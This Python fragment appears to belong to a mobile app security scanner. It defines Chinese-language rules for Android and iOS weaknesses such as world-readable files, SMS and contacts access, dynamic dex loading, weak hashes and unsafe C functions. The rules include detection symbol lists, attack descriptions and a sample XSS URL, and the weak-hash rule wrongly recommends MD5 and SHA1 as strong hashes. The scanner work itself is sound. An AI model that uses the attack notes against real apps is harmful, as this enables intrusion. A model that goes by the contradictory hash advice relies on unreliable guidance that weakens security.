        'causes': 'MODE_PRIVATE|Context.MODE_PRIVATE',
        'typ': 4,
        'tag': 'MODE_PRIVATE',
        'rank': '3',
        'affect': '该漏洞可影响Android所有系统;可能造成信息泄露和恶意篡改',
        'demo': ''' private final int[] MODES=new int[]{
                    Activity.MODE_PRIVATE,
                    Activity.MODE_WORLD_READABLE,
                Activity.MODE_WORLD_WRITEABLE,
                     Activity.MODE_APPEND
                 };  ''',
        'attack_method': '攻击者可以很容易编写一个读取文件内容的应用程序来读取其中信息',
        'fix_suggest': '严格控制写入权限',
        'is_show': 1,
    }
    r_list.append(private_write)

    outside_memorycard = {
        'name': '对外部存储卡进行读写',
        'cve': 'outside_memorycard',
        'detail': '程序可以对外部存储卡随意读写',
        'causes': '''如果权限里面声明WRITE_EXTERNAL_STORAGE并且.getExternalStorage 或者 .getExternalFilesDir()在代码里出现''',
        'typ': 4,
        'tag': 'WRITE_EXTERNAL_STORAGE',
        'rank': '3',
        'affect': '''该漏洞可影响Android所有版本，程序可以对外部存储卡随意读写导致敏感信息泄漏''',
        'demo': '',
        'attack_method': '攻击者可以写第三方应用来读取外部存储卡信息',
        'fix_suggest': '严格控制读写权限',
        'is_show': 1,
    }
    r_list.append(outside_memorycard)

    provider_sqlite = {
        'name': '使用SQLite数据库',
        'cve': 'provider_sqlite',
        'detail': '数据库中明文存储用户敏感信息',
        'causes': '程序使用sqlite数据库存储用户数据',
        'typ': 7,
        'tag': 'sqlite',
        'rank': '3',
        'affect': '该漏洞可影响Android/iOS所有版本;可能会泄漏用户敏感信息',
        'demo': '''SQLiteDatabase db = openOrCreateDatabase("test.db", Context.MODE_PRIVATE, null);  
            db.execSQL("DROP TABLE IF EXISTS person");  ''',
        'attack_method': '攻击者可以通过复制数据库或其他方式盗取用户敏感信息',
        'fix_suggest': '建议敏感信息加密保存或不保存',
        'is_show': 1,
    }
    r_list.append(provider_sqlite)

    provider_hardcoded = {
        'name': '代码硬编码敏感信息',
        'cve': 'provider_hardcoded',
        'detail': '应该被单独加密的信息直接在代码中用其他编码转码处理',
        'causes': '代码中出现其他编码例如base64或URL编码',
        'typ': 4,
        'tag': 'hardcode',
        'rank': '4',
        'affect': 'Android所有版本;某些文件信息或敏感信息应该被写在文件中单独加密，但却直接写在代码中用其他编码转码处理,可能泄漏用户敏感信息',
        'demo': 'int i = MTIzNDU2;',
        'attack_method': '攻击者可以提取所有其他编码进行转码获取用户信息',
        'fix_suggest': '添加额外校验，如果是秘钥信息建议本已在动态链接里；如果是其他敏感信息，建议加密处理',
        'is_show': 1,
    }
    r_list.append(provider_hardcoded)

    provider_servicesocket = {
        'name': '启动服务端套接字',
        'cve': 'provider_servicesocket',
        'detail': '通过无线发出的信号捕捉、篡改数据流量包控制用户机器',
        'causes': '无线连接其他设备',
        'typ': 3,
        'tag': 'service',
        'rank': '2',
        'affect': '''该漏洞可影响Android所有版本;当用户使用无线来传送或接收文件时，攻击者能够通过无线发出的信号捕捉、篡改数据流量包控制用户机器,可能导致缓冲区溢出、应用崩溃、敏感信息泄漏或远程代码执行''',
        'demo': '无',
        'attack_method': '攻击者通过无线设备远程控制用户设备',
        'fix_suggest': '如果业务需求开启无线连接，建议传输数据严谨过滤；如果非业务需求，建议关闭无线设备',
        'is_show': 1,
    }
    r_list.append(provider_servicesocket)

    user_defined_socket = {
        'name': '使用自定义套接字',
        'cve': 'user_defined_socket',
        'detail': '自定义套接字则可能出现更多的安全隐患加重服务端工作压力',
        'causes': '应用开发者使用自定义套接字',
        'typ': 3,
        'tag': 'service',
        'rank': '2',
        'affect': '''该漏洞可影响Android所有版本;使用自定义套接字会导致服务端压力过大，拒接服务或缓冲区溢出等问''',
        'demo': '无',
        'attack_method': '攻击者可能会精心构造socket数据包来攻击服务器或客户端',
        'fix_suggest': '建议使用传统套接字',
        'is_show': 1,
    }
    r_list.append(user_defined_socket)

    provider_udpsocket = {
        'name': '使用UDP套接字通信',
        'cve': 'provider_udpsocket',
        'detail': '用户数据报协议，是一个简单的面向数据报的运输层协议',
        'causes': '开发者使用UDP套接字通信',
        'typ': 3,
        'tag': 'service',
        'rank': '2',
        'affect': '该漏洞可影响Android所有版本;数据传输可靠性降低',
        'demo': 'client.Send(bt, bt.Length, serverIP);//其中serverIP指定信息发送目的地址和端口。',
        'attack_method': '''当受害系统接收到一个 UDP 数据包的时候，它会确定目的端口正在等待中的应用程序。当它发现该端口中并不存在正在等待的应用程序，它就会产生一个目的地址无法连接的 ICMP 数据包发送给该伪造的源地址。如果向受害者机器发送了足够多的 UDP 数据包的时候，整个系统就会瘫痪。''',
        'fix_suggest': '如非必要建议使用tcp协议',
        'is_show': 1,
    }
    r_list.append(provider_udpsocket)

    provider_messageoperate = {
        'name': '短信操作',
        'cve': 'provider_messageoperate',
        'detail': '第三方应用可以对短信操作',
        'causes': '应用调用了系统的短信接口',
        'typ': 4,
        'tag': 'sms',
        'rank': '2',
        'affect': '该漏洞可影响Android所有版本;第三方应用可以对短信操作,可能造成恶意盗取话费或发送虚假消息',
        'demo': '''SmsManager smsManager = SmsManager.getDefault();  
            List<String> divideContents = smsManager.divideMessage(content);
            for (String text : divideContents) {
                smsManager.sendTextMessage("150xxxxxxxx", null, text, sentPI, deliverPI);
            }  ''',
        'attack_method': '攻击者精心设计程序调用短信接口，发送虚假信息或盗取话费',
        'fix_suggest': '对短信操作权限给予风险提示',
        'is_show': 1,
    }
    r_list.append(provider_messageoperate)

    provider_contactperson = {
        'name': '联系人查询',
        'cve': 'provider_contactperson',
        'detail': '第三方应用可能通过非法手段获取联系人信息',
        'causes': '''<uses-permission android:name="android.permission.READ_CONTACTS" />''',
        'typ': 4,
        'tag': 'COL_PHONE_NUMBER',
        'rank': '2',
        'affect': '该漏洞可影响Android所有版本;第三方应用可能通过非法手段获取联系人信息,泄漏联系人信息或发送伪造用户身份发送恶意消息',
        'demo': '''//遍历所有的联系人下面所有的电话号码  
                           String phoneNumber = phoneCursor.getString(COL_PHONE_NUMBER);  
                           ContactItemData data = new ContactItemData();  
                           String phoneFiled = new String();  
                           data.name = displayName;  
                           data.number = phoneFiled + ":" + phoneNumber;  
                           data.check = false;  
                           list.add(data);''',
        'attack_method': '遍历手机通讯录向手机中所有联系人发送带有恶意下载链接的短信',
        'fix_suggest': '第三方应用读取联系人信息时给予风险提示',
        'is_show': 1,
    }
    r_list.append(provider_contactperson)

    provider_location = {
        'name': '获得手机位置信息',
        'cve': 'provider_location',
        'detail': '通过网络或GPS或去用户所在位置的经纬度',
        'causes': 'AndroidManifest.xml文件里加入了ACCESS_FINE_LOCATION权限',
        'typ': 1,
        'tag': 'LOCATION_SERVICE',
        'rank': '2',
        'affect': '''该漏洞可影响Android所有版本;通过网络或GPS或去用户所在位置的经纬度,泄漏用户位置隐私''',
        'demo': '''locManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE); 
            locListener = new LocationListener() { 
            @Override 
            public void onStatusChanged(String provider, int status, 
                Bundle extras) { 
                // TODO Auto-generated method stub 
            } 
            @Override 
                public void onProviderEnabled(String provider) { 
                // TODO Auto-generated method stub 
            } 
            @Override 
            public void onProviderDisabled(String provider) { 
                // TODO Auto-generated method stub 
            } 
            @Override 
            public void onLocationChanged(Location location) { 
                // TODO Auto-generated method stub 
                mobileLocation = location; 
            } 
            }; 
            locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locListener);''',
        'attack_method': '通过第三方应用盗取用户位置信息',
        'fix_suggest': '当第三方应用获取用户位置信息时给予风险提示',
        'is_show': 1,
    }
    r_list.append(provider_location)

    provider_siminfo = {
        'name': '获得SIM卡信息',
        'cve': 'provider_siminfo',
        'detail': '未经用户允许获取SIM卡信息',
        'causes': '''TelephonyManager tm = (TelephonyManager )Context.getSystemService (Context.TELEPHONY_SERVICE); TelephonyManager 的使用 TelephonyManager 提供设备上获取通讯服务信息的入口，应用程序使用这个类的方法来获取电话的服务商或者状态。程序也可以注册一个监听器来监听电话状态的改变。 不需要直接实例化这个类，使用Context.getSystemService( Context.TELEPHONY _SERVICE) 来获取这个类的实例''',
        'typ': 4,
        'tag': 'TELEPHONY_SERVICE',
        'rank': '2',
        'affect': '该漏洞可影响Android所有版本;泄漏用户电话号码以及电话号码绑定的相关敏感信息',
        'demo': '''public String getNativePhoneNumber() {  
            String NativePhoneNumber=null;  
            NativePhoneNumber=telephonyManager.getLine1Number();  
            return NativePhoneNumber;  
        }  ''',
        'attack_method': '攻击者可对用户SIM卡进行补卡攻击',
        'fix_suggest': '第三方应用获取用户SIM卡信息时给予风险提示',
        'is_show': 1,
    }
    r_list.append(provider_siminfo)

    provider_tolodedex = {
        'name': '动态加载dex',
        'cve': 'provider_tolodedex',
        'detail': '不能够保护应用免遭恶意代码的注入',
        'causes': '''Android 系统提供了一种类加载器DexClassLoader，其可以在运行时动态加载并解释执行包含在JAR或APK文件内的DEX文件。''',
        'typ': 4,
        'tag': 'DEX',
        'rank': '3',
        'affect': '''该漏洞可影响Anroid4.1之前，如果应用没有正确的动态加载DEX文件，将会导致攻击者的任意代码被自动执行，进一步实施欺诈、获取账号密码或其他恶意行为等危害''',
        'demo': '''//加载外部dex
            mClassLoader = new DexClassLoader ( f . getAbsolutePath ( ),
            mContext . getCacheDir ( ) . getAbsolutePath ( ),
            null, mContext . getClassLoader ( ) ) ;''',
        'attack_method': '利用DexClassLoader（）运行时加载JAR/DEX文件，该将恶意代码替换掉被加载的DEX文件，或向该被加载的DEX文件注入恶意代码。',
        'fix_suggest': '将所需要动态加载的DEX/APK文件放置在APK内部或应用私有目录中；使用加密网络协议进行下载加载的DEX/APK文件并将其放置在应用私有目录中；对不可信的加载来源进行完整性校验。',
        'is_show': 1,
    }
    r_list.append(provider_tolodedex)

    '''ios 相关
    '''
    use_pie_flag = {
        'name': '编译时使用PIE标志',
        'cve': 'use_pie_flag',
        'detail': '如果应用使用位置无关的可执行（PIE）标记编译，则能够使得内存中的可执行代码随机化分步，这是一种通用的防止内存读写和代码执行的有效手段。',
        'causes': '''编译时使用独立的可执行文件对应用程序进行编译''',
        'typ': 4,
        'tag': 'xcode',
        'rank': '3',
        'affect': '',
        'demo': '',
        'attack_method': '',
        'fix_suggest': '',
        'is_show': 1,
    }
    r_list.append(use_pie_flag)

    use_arc_flag = {
        'name': '编译时使用ARC标志',
        'cve': 'use_arc_flag',
        'detail': '如果应用在编译时使用自动化引用计数器（ARC）标签，它能够对Objective-C对象的内存进行管理，有效地防止针对内存的攻击。',
        'causes': '',
        'typ': 4,
        'tag': 'xcode',
        'rank': '3',
        'affect': '',
        'demo': '',
        'attack_method': '',
        'fix_suggest': '',
        'is_show': 1,
    }
    r_list.append(use_arc_flag)

    malloc_memory = {
        'name': '内存分配安全',
        'cve': 'malloc_memory',
        'detail': '应用的可执行文件如果使用malloc函数，那么在分配内存时不会对内存进行初始化操作，从而导致应用奔溃和增加安全隐患。建议更换为安全的calloc函数。',
        'causes': '',
        'typ': 4,
        'tag': 'xcode',
        'rank': '3',
        'affect': '',
        'demo': '',
        'attack_method': '',
        'fix_suggest': '',
        'is_show': 1,
    }
    r_list.append(malloc_memory)

    use_ssp_flag = {
        'name': '编译时使用SSP标志',
        'cve': 'use_ssp_flag',
        'detail': 'APP如果使用堆栈保护器（SSP）标志编译，能够有效地防止对堆栈数据的覆盖而造成的溢出攻击。',
        'causes': '',
        'typ': 4,
        'tag': 'xcode',
        'rank': '3',
        'affect': '',
        'demo': '',
        'attack_method': '',
        'fix_suggest': '',
        'is_show': 1,
    }
    r_list.append(use_ssp_flag)

    anti_debug = {
        'name': '反调试功能',
        'cve': 'anti_debug',
        'detail': '应用程序如果使用ptrace系统调用，该调用通常用来防止软件调试和进程注入。若没有使用该系统调用可能会造成安全隐患。',
        'causes': '',
        'typ': 4,
        'tag': 'xcode',
        'rank': '3',
        'affect': '',
        'demo': '',
        'attack_method': '',
        'fix_suggest': '',
        'is_show': 1,
    }
    r_list.append(anti_debug)

    use_webview = {
        'name': '使用Webview组件',
        'cve': 'use_webview',
        'detail': '使用Webview组件的应用通常调用系统自身的HTML解析器，在面临跨站点脚本攻击、远程代码执行等攻击方式时具有明显的弱势。',
        'causes': '''代码中使用了Webview组件''',
        'typ': 7,
        'tag': 'webview',
        'rank': '3',
        'affect': '该威胁可影响Android/iOS所有系统版本',
        'demo': '''None''',
        'attack_method': 'http://www.server.com/msg=<script>alert("XSS!")</script>',
        'fix_suggest': '尽量不使用Webview组件或者使用具有安全配置的Webview组件。',
        'is_show': 1,
    }
    r_list.append(use_webview)

    week_hash = {
        'name': '弱哈希函数使用',
        'cve': 'week_hash',
        'detail': '使用弱哈希函数可能会产生哈希碰撞，或者造成哈希还原等的攻击',
        'causes': '''代码中出现：CC_MD2_Init|CC_MD2_Update|CC_MD2_Final|CC_MD2|MD2_Init|MD2_Update|MD2_Final|CC_MD4_Init|CC_MD4_Update|CC_MD4_Final|CC_MD4|MD4_Init|MD4_Update|MD4_Final|CC_MD5_Init|CC_MD5_Update|CC_MD5_Final|CC_MD5|MD5_Init|MD5_Update|MD5_Final|MD5Init|MD5Update|MD5Final|CC_SHA1_Init|CC_SHA1_Update|CC_SHA1_Final|CC_SHA1|SHA1_Init|SHA1_Update|SHA1_Final''',
        'typ': 4,
        'tag': 'hash',
        'rank': '3',
        'affect': '该威胁可影响Android/iOS所有系统版本',
        'demo': '''None''',
        'attack_method': '',
        'fix_suggest': '使用强哈希函数如MD5，SHA1等。',
        'is_show': 1,
    }
    r_list.append(week_hash)

    week_crypto = {
        'name': '弱加密函数使用',
        'cve': 'week_crypto',
        'detail': '使用弱加密函数后，已经加密的数据不能得到有效的保护，因为其密文可以被还原或者被猜解。',
        'causes': '''代码中出现：kCCAlgorithmDES|kCCAlgorithm3DES||kCCAlgorithmRC2|kCCAlgorithmRC4|kCCOptionECBMode|kCCOptionCBCMode''',
        'typ': 4,
        'tag': 'crypto',
        'rank': '3',
        'affect': '该威胁可影响Android/iOS所有系统版本',
        'demo': '''None''',
        'attack_method': '',
        'fix_suggest': '使用强加密函数如AES、RSA等。',
        'is_show': 1,
    }
    r_list.append(week_crypto)

    unsafe_api = {
        'name': '不安全的API函数引用',
        'cve': 'unsafe_api',
        'detail': '使用已经取消的/不安全的API函数，可能会造成不兼容的问题，从而导致本地拒绝服务，或者出现信息泄露和代码执行等安全问题。',
        'causes': '''代码中出现：alloca|gets|memcpy|scanf|sprintf|sscanf|strcat|StrCat|strcpy|StrCpy|strlen|StrLen|strncat|StrNCat|strncpy|StrNCpy|strtok|swprintf|vsnprintf|vsprintf|vswprintf|wcscat|wcscpy|wcslen|wcsncat|wcsncpy|wcstok|wmemcpy''',
        'typ': 4,
        'tag': 'api',
        'rank': '3',
        'affect': '该威胁可影响iOS所有系统版本',
        'demo': '''None''',
        'attack_method': '',
        'fix_suggest': '根据官方文档替换为其他类似函数。',
        'is_show': 1,
    }
    r_list.append(unsafe_api)

    plist_info = {
        'name': '配置文件信息',
        'cve': 'plist_info',
        'detail': 'iOS应用的配置文件中可能包含了手势密码、系统API地址等敏感信息',
        'causes': '''iOS应用中后缀名为plist的文件即为配置文件，里面可能包含了应用运行所需要的关键信息。''',
        'typ': 7,
        'tag': 'plist,xml',
        'rank': '3',
        'affect': '',
        'demo': '''None''',
        'attack_method': '',
        'fix_suggest': '不要将关键信息放入配置文件中，或者将关键信息加密，运行时动态解密。',
        'is_show': 1,
    }
    r_list.append(plist_info)

    ios_libs = {
        'name': 'iOS运行时动态库信息',
        'cve': 'ios_libs',
        'detail': 'iOS应用运行时需要调用的系统支持文件',
        'causes': '''iOS应用格式为Mach-o格式的文件，需要调用后缀名为dylib的系统动态库文件，类似于Windows下的dll文件，可能会面临动态库劫持的风险。''',
        'typ': 7,
        'tag': 'dylib',
        'rank': '1',
        'affect': '',
        'demo': '''None''',
        'attack_method': '',
        'fix_suggest': '尽量不要使用第三方或者自定义的动态库文件。',
        'is_show': 1,
    }
    r_list.append(ios_libs)

    ios_libs = {
        'name': '使用堆栈保护技术',
        'cve': 'use_stack_protect',
        'detail': '以堆栈溢出为代表的缓冲区溢出攻击已经成为一种普遍的安全漏洞和攻击手段,使用编译器堆栈保护技术可以有效阻止缓冲区溢出攻击',
        'causes': '''缓冲区溢出攻击''',
        'typ': 7,
        'tag': 'dylib',
        'rank': '1',
        'affect': '',
        'demo': '''None''',
        'attack_method': '',
        'fix_suggest': '在编译动态库时要使用堆栈保护技术',
        'is_show': 1,
    }
    r_list.append(ios_libs)

    return r_list
